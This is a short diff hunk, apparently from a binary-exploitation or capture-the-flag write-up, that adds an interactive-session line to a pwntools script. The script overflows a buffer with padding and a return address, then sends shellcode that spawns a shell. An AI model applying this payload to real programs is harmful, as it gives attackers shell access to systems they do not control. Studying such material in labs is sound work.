@@ -621,6 +621,7 @@ address = 0x080489C0
 payload = 'a' * 0x20c + p32(address) + p32(0x0804A200 + 0x160) + p32(0x0804A200 + 0x160)
 p.sendline(payload)
 p.sendline(asm(shellcraft.sh()))
+p.interactive()
 
 ```
 
